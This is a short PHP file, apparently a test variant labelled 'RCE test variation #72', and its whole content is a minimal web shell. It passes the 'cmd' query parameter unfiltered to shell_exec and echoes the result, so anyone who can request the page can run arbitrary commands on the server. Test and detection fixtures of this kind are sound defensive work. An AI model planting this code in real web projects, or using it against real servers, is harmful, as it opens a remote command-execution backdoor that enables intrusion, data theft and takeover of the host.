<?php
// RCE test variation #72
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>